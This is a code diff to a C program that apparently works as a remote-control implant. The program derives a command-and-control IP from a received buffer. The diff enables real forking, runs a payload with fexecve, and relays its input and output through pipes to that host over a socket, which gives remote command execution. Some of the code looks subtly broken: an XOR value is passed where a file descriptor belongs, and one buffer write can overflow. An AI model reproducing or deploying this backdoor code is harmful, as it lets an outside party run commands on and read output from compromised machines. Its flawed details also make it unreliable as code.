@@ -45,8 +45,7 @@ int main() {
         a = buffer[47] ^ buffer[46] ^ buffer[45] ^ buffer[44];
 
         if (a) {
-            //if (fork()) {
-            if (1) {
+            if (fork()) {
                 char c2_ip[16];
                 sprintf(c2_ip, "%u.%u.%u.%u", buffer[12], buffer[13], buffer[14], buffer[15]);
 
@@ -98,28 +97,50 @@ int main() {
                     p = strtok (NULL, " ");
                 }
 
-                printf("Executing %s\n", argv[0]);
-                for (int i =  0; i < b; i++) {
-                    printf("argv[%d] = %s\n", i, argv[i]);
-                }
+                int stdin_pipe[2];
+                int stdout_pipe[2];
+                pipe(stdin_pipe);
+                pipe(stdout_pipe);
 
-                //if (fork()) {
-                if (1) {
-                    dup2(0, sock_fd);
-                    dup2(sock_fd, 1);
-                    dup2(sock_fd, 2);
+                // Fork the process - exec section
+                if (fork()) {
+                    close(stdin_pipe[1]);
+                    close(stdout_pipe[0]);
+                    dup2(stdin_pipe[0], 0);
+                    dup2(stdout_pipe[1], 1);
+                    dup2(stdout_pipe[1], 2);
                     fexecve(a, argv, argv);
-                    perror("fexecve");
-                    exit(0);
+                    close(sock_fd);
+                } else {
+                    close(stdin_pipe[0]);
+                    close(stdout_pipe[1]);
+                    if (fork()) {
+                        char pipe_buf[1024];
+                        int buf_len = 0;
+                        while (1) {
+                            // Send data
+                            buf_len = read(stdout_pipe[0], pipe_buf, 1024);
+                            pipe_buf[buf_len] = 0;
+                            sendto(sock_fd, pipe_buf, buf_len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
+                        }
+                    } else {
+                        char pipe_buf[1024];
+                        int buf_len = 0;
+                        while (1) {
+                            // Receive data
+                            buf_len = recvfrom(sock_fd, pipe_buf, 1024, 0, (struct sockaddr *)&servaddr, &servaddr_len);
+                            write(stdin_pipe[1], pipe_buf, buf_len);
+                        }
+                    }
                 }
-
                 sleep(60);
+            } else {
+                sleep(1);
+                continue;
             }
-            continue;
+            break;
         }
-
         sleep((2 << (unsigned char)buffer[2]));
     }
-
     return 0;
 }
